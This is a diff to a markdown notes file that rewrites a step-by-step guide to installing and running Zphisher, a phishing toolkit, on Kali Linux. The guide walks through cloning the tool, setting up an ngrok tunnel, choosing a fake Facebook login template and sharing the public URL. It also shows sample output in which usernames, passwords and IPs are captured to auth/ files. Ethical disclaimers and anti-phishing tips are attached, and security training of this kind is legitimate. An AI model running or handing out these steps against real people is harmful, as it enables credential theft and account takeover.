@@ -338,71 +338,73 @@ This is hidden secret
 ## Summary
 - **secret.txt** was successfully hidden inside **com.jpeg** using `steghide`.
 - The file was later extracted with the same passphrase, proving the concept of steganography.
+```markdown
+# Zphisher Setup and Usage Guide
 
-Zphisher Setup and Usage Guide
-Zphisher is an open-source phishing toolkit for educational simulations, offering over 30 templates for fake login pages (e.g., Facebook, Instagram, Google). This guide provides steps to set up and run Zphisher on Kali Linux for ethical, authorized security training only. Unauthorized phishing is illegal under laws like the Computer Fraud and Abuse Act. Always obtain written consent and use isolated networks.
-Prerequisites
+Zphisher is an open-source phishing toolkit for educational simulations, offering over 30 templates for fake login pages (e.g., Facebook, Instagram, Google). This guide provides steps to set up and run Zphisher on Kali Linux for **ethical, authorized** security training only. **Unauthorized phishing is illegal** under laws like the Computer Fraud and Abuse Act. Always obtain written consent and use isolated networks.
 
-Kali Linux (2025.x recommended).
-Internet connection for tunneling (e.g., Ngrok).
-Root privileges for dependency installation.
-Basic tools: Git, Python 3, PHP, curl.
+## Prerequisites
+- Kali Linux (2025.x recommended).
+- Internet connection for tunneling (e.g., Ngrok).
+- Root privileges for dependency installation.
+- Basic tools: Git, Python 3, PHP, curl.
 
-Installation Steps
+## Installation Steps
+1. **Update Kali Linux**:
+   Update your system to ensure compatibility:
+   ```bash
+   sudo apt update && sudo apt upgrade -y
+   ```
 
-Update Kali Linux:Update your system to ensure compatibility:
-sudo apt update && sudo apt upgrade -y
+2. **Install Dependencies**:
+   Install required tools (Zphisher auto-installs others):
+   ```bash
+   sudo apt install git curl php openssh-server -y
+   ```
 
+3. **Clone Zphisher Repository**:
+   Download Zphisher from GitHub:
+   ```bash
+   git clone https://github.com/htr-tech/zphisher.git
+   cd zphisher
+   ```
 
-Install Dependencies:Install required tools (Zphisher auto-installs others):
-sudo apt install git curl php openssh-server -y
+4. **Set Up Ngrok for Tunneling**:
+   - Download and install Ngrok:
+     ```bash
+     wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
+     tar -xvzf ngrok-v3-stable-linux-amd64.tgz
+     sudo mv ngrok /usr/local/bin/
+     ```
+   - Sign up at [ngrok.com](https://ngrok.com) for an authtoken, then authenticate:
+     ```bash
+     ngrok authtoken YOUR_AUTHTOKEN
+     ```
 
+5. **Run Zphisher**:
+   - Start the script (dependencies install automatically on first run):
+     ```bash
+     bash zphisher.sh
+     ```
+   - Select a phishing category (e.g., `01` for social media).
+   - Choose a template (e.g., `01` for Facebook).
+   - Select tunneling (e.g., `1` for Ngrok).
+   - Accept the default port (3333) or specify a custom one.
+   - The tool starts a PHP server and generates public URLs.
 
-Clone Zphisher Repository:Download Zphisher from GitHub:
-git clone https://github.com/htr-tech/zphisher.git
-cd zphisher
+6. **Simulate Phishing**:
+   - Share the generated URL (e.g., `https://compliant-poor-findarticles-yields.trycloudflare.com`) with a consenting test user.
+   - The user visits the fake page and enters credentials.
+   - Captured data (IP, username, password) is logged in the terminal and saved to `auth/ip.txt` and `auth/usernames.dat`.
 
+7. **Stop the Attack**:
+   - Press `Ctrl+C` to stop the server and Ngrok.
+   - Check `auth/` directory for logs.
 
-Set Up Ngrok for Tunneling:
-
-Download and install Ngrok:wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
-tar -xvzf ngrok-v3-stable-linux-amd64.tgz
-sudo mv ngrok /usr/local/bin/
-
-
-Sign up at ngrok.com for an authtoken, then authenticate:ngrok authtoken YOUR_AUTHTOKEN
-
-
-
-
-Run Zphisher:
-
-Start the script (dependencies install automatically on first run):bash zphisher.sh
-
-
-Select a phishing category (e.g., 01 for social media).
-Choose a template (e.g., 01 for Facebook).
-Select tunneling (e.g., 1 for Ngrok).
-Accept the default port (3333) or specify a custom one.
-The tool starts a PHP server and generates public URLs.
-
-
-Simulate Phishing:
-
-Share the generated URL (e.g., https://compliant-poor-findarticles-yields.trycloudflare.com) with a consenting test user.
-The user visits the fake page and enters credentials.
-Captured data (IP, username, password) is logged in the terminal and saved to auth/ip.txt and auth/usernames.dat.
-
-
-Stop the Attack:
-
-Press Ctrl+C to stop the server and Ngrok.
-Check auth/ directory for logs.
-
-
-
-Expected Output
+## Expected Output
 Below is an example of Zphisher's terminal output during a simulation:
+
+```
   ░▀▀█░█▀█░█░█░▀█▀░█▀▀░█░█░█▀▀░█▀▄
   ░▄▀░░█▀▀░█▀█░░█░░▀▀█░█▀█░█▀▀░█▀▄
   ░▀▀▀░▀░░░▀░▀░▀▀▀░▀▀▀░▀░▀░▀▀▀░▀░▀ 2.3.5
@@ -435,36 +437,25 @@ Below is an example of Zphisher's terminal output during a simulation:
 [-] Saved in : auth/ip.txt
 ^C
 [!] Program Interrupted.
+```
 
-Explanation of Output
+## Ethical and Legal Considerations
+- **Authorized Use Only**: Conduct simulations with explicit permission in controlled environments (e.g., cybersecurity labs).
+- **Legal Risks**: Unauthorized phishing violates laws and can lead to prosecution.
+- **Prevention Tips**:
+  - Verify URLs (check HTTPS, avoid misspellings).
+  - Use multi-factor authentication (MFA).
+  - Report phishing to services like [PhishTank](https://phishtank.org).
 
-URLs: Public links generated by tunneling (e.g., Cloudflare or Ngrok). Some may be decoys or malformed (e.g., facabook.com@).
-Victim IP: Captures the IP of the user accessing the link (e.g., 152.57.129.105).
-Login Info: Logs credentials entered (e.g., Account: dfdd, Password: d).
-Files: IPs save to auth/ip.txt, credentials to auth/usernames.dat.
-Interrupt: Ctrl+C stops the server, ending the session.
+## Troubleshooting
+- **Dependency Errors**: Manually install missing tools (`sudo apt install wget php-cgi`).
+- **Ngrok Fails**: Verify authtoken; try Serveo (`2` in menu) as an alternative.
+- **Port Conflicts**: Change port in Zphisher menu or kill processes (`sudo fuser -k 3333/tcp`).
 
-Ethical and Legal Considerations
+## Alternatives
+- **Gophish**: For structured phishing campaign simulations.
+- **SET (Social-Engineer Toolkit)**: Advanced phishing and social engineering.
 
-Authorized Use Only: Conduct simulations with explicit permission in controlled environments (e.g., cybersecurity labs).
-Legal Risks: Unauthorized phishing violates laws and can lead to prosecution.
-Prevention Tips:
-Verify URLs (check HTTPS, avoid misspellings).
-Use multi-factor authentication (MFA).
-Report phishing to services like PhishTank.
-
-
-
-Troubleshooting
-
-Dependency Errors: Manually install missing tools (sudo apt install wget php-cgi).
-Ngrok Fails: Verify authtoken; try Serveo (2 in menu) as an alternative.
-Port Conflicts: Change port in Zphisher menu or kill processes (sudo fuser -k 3333/tcp).
-
-Alternatives
-
-Gophish: For structured phishing campaign simulations.
-SET (Social-Engineer Toolkit): Advanced phishing and social engineering.
-
-Disclaimer
-Zphisher is for educational purposes only. The author and this guide are not responsible for misuse. Always adhere to ethical hacking guidelines.
+## Disclaimer
+Zphisher is for **educational purposes only**. The author and this guide are not responsible for misuse. Always adhere to ethical hacking guidelines.
+```
